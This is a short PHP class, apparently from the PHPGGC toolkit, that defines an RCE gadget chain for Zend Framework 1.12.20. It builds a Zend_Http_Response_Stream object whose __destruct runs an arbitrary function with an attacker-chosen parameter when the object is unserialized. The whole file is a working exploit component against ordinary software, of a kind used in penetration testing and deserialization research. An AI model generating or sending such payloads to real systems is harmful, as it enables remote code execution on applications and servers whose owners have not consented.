<?php

namespace GadgetChain\ZendFramework;

class RCE7 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.12.20';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters["function"];
        $parameter = $parameters["parameter"];

        return new \Zend_Http_Response_Stream($function, $parameter);
    }
}